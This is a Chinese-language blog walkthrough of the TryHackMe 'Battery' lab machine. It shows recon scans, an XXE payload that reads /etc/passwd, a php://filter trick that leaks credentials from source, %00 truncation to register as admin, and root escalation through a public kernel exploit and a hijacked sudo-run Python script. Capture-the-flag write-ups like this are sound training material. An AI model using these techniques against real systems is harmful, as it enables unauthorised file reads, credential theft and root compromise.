---
title: Battery (Try Hack Me Writeup)
date: 2021-09-02T23:51:00+08:00
draft: false
url: "/2021/09/02/battery-try-hack-me-writeup/"
categories:
  - 滲透測試
  - Try Hack Me
showToc: true
TocOpen: false
---

> 
URL :　https://tryhackme.com/room/battery

IP : 10.10.207.162

## Recon

- 掃 Port`rustscan -a 10.10.207.162 -r 1-65535`![](/uploads/2022/02/cc8f0-YI7brFj.png)
- 發現有開22
- 80`nmap -A -p22,80 10.10.207.162`- ![](/uploads/2022/02/5cb29-fpTOJSl.png)

## Web

- 觀察首頁![](/uploads/2022/02/b8e98-kzK5QSI.png)掃路徑- ![](/uploads/2022/02/9c9e8-zW9T06O.png)
- `/forms`![](/uploads/2022/02/aab41-0BtjlCh.png)`/admin.php`- ![](/uploads/2022/02/68a4e-Yt1XqNk.png)發現 `/forms` 把 Header 拔掉就不會自動跳轉- ![](/uploads/2022/02/d39ae-dBIg21Q.png)
- 裡面傳送的資料是 XML ，可能可以 XXE![](/uploads/2022/02/c3701-MnxLcgL.png)但沒有登入都失敗

```java
function XMLFunction(){
	var xml = '' +
		'' +
		'' +
		'' + $('#name').val() + '' +
		'' + $('#search').val() + '' +
		'';
	var xmlhttp = new XMLHttpRequest();
	xmlhttp.onreadystatechange = function () {
		if(xmlhttp.readyState == 4){
			console.log(xmlhttp.readyState);
			console.log(xmlhttp.responseText);
			document.getElementById('errorMessage').innerHTML = xmlhttp.responseText;
		}
	}
	xmlhttp.open("POST","forms.php",true);
	xmlhttp.send(xml);
};
```

- 在 `register.php` 註冊一組帳密`meow`
- `ABC`
- `meow`
- ![](/uploads/2022/02/4f717-z1niZ8X.png)
- 註冊成功![](/uploads/2022/02/b18ad-hqNbHMh.png)嘗試登入- ![](/uploads/2022/02/c3efc-Lo6rA6Z.png)
- 使用介面上的功能![](/uploads/2022/02/a4018-o5zsYOs.png)
- 發現不能使用再註冊一組- `meow1`
- `DEF`
- `meow1`掃目錄- ![](/uploads/2022/02/8b15b-4zXmQmN.png)
- 發現一個 `/report`載下來發現是一個 ELF- ![](/uploads/2022/02/54614-tQ07xT1.png)

## Reverse

- 選單![](/uploads/2022/02/5e4c4-0fPOAwu.png)使用者- ![](/uploads/2022/02/24d95-45VYQ51.png)字串比較- ![](/uploads/2022/02/1f1ca-e5GzGAk.png)更新- ![](/uploads/2022/02/99078-LWMnjwK.png)
- 這邊看到 `admin@bank.a` 滿可疑的

## Web

- 嘗試註冊 `admin@bank.a`![](/uploads/2022/02/dc8f7-ETydBcl.png)
- ![](/uploads/2022/02/9e857-z3FWmBy.png)被嘲諷ㄌQQ
- 但這代表應該確實跟這個有關!!用 Burp 後面加上 `%00` 截斷- ![](/uploads/2022/02/bef3d-Rz7ZLOk.png)註冊成功- ![](/uploads/2022/02/b70be-xpZQPEi.png)後台亂輸入都會噴錯- ![](/uploads/2022/02/3471e-1PJTJn7.png)重新試著 XXE- ![](/uploads/2022/02/6937d-jmnfWHX.png)

```
function XMLFunction(){
    var xml = '' +
        '\n' +
        ' ]>\n' +
        '' +
        '' + "0" + '' +
        '' + "&b;" + '' +
        '';
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if(xmlhttp.readyState == 4){
            console.log(xmlhttp.readyState);
            console.log(xmlhttp.responseText);
        }
    }
    xmlhttp.open("POST","forms.php",true);
    xmlhttp.send(xml);
};
XMLFunction();
```

- 可以讀檔![](/uploads/2022/02/dd64e-Wfam6PO.png)

```
cyber:x:1000:1000:cyber,,,:/home/cyber:/bin/bash
mysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false
yash:x:1002:1002:,,,:/home/yash:/bin/bash
```

- 看起來有興趣的使用者`cyber`
- `yash`讀取原始碼- `php://filter/convert.base64-encode/resource=/var/www/html/acc.php`
- ![](/uploads/2022/02/b86ed-EXkrQXL.png)
- 找到註解上的密碼`//MY CREDS :- cyber:super#secure&password!`

## SSH

- ![](/uploads/2022/02/d33d2-WhKKIPs.png)順利連上取得 Base Flag- ![](/uploads/2022/02/8effd-3aOe5eP.png)

## 提權

- 起手式 `sudo -l`![](/uploads/2022/02/ca4fd-OF32tzf.png)
- 發現可以用 root 執行一個 `run.py``run.py`- ![](/uploads/2022/02/ee3b7-fJIS0Oe.png)
- 但我們沒有權限讀取他 QQ觀察原始碼- `admin.php`找到 mysql 的帳密Dump Mysql- mysqldump -u root -h 127.0.0.1 -p details > a.sql
- ![](/uploads/2022/02/26c6a-6SQ3wdb.png)
- ![](/uploads/2022/02/ad245-EotjMMo.png)
- 看到一組密碼![](/uploads/2022/02/9d7e1-amFWjRV.png)
- `I_know_my_password`但好像就沒有什麼進展了 QQ跑 Linpeas- ![](/uploads/2022/02/e4aa1-W4vdGzF.png)
- 發現 Linux Kernel 好像有點舊，可以用 Exploit
- https://www.exploit-db.com/exploits/37292試著載下來編譯執行- ![](/uploads/2022/02/ad3f8-H9YKMfY.png)
- 就成功 Root ㄌFlag2- ![](/uploads/2022/02/5ba37-y95l3c8.png)Root Flag- ![](/uploads/2022/02/5c482-fAVwuni.png)
- ![](/uploads/2022/02/eae5c-GBtAZjF.png)

## 另外一種提權法

- 剛剛可以用 sudo 執行 `run.py`但是沒有權限可以讀取但因為這是我的家目錄，所以我可以改檔名、新增檔案- ![](/uploads/2022/02/a8531-Q9fWApP.png)所以自己創一個 `run.py`- `import os`
- `os.system("/bin/bash")`再 sudo 它- ![](/uploads/2022/02/7b0ed-6O92JvY.png)
- 也可以順利提權

## 學到ㄌ

%00 截斷  
XXE 記得加 ;
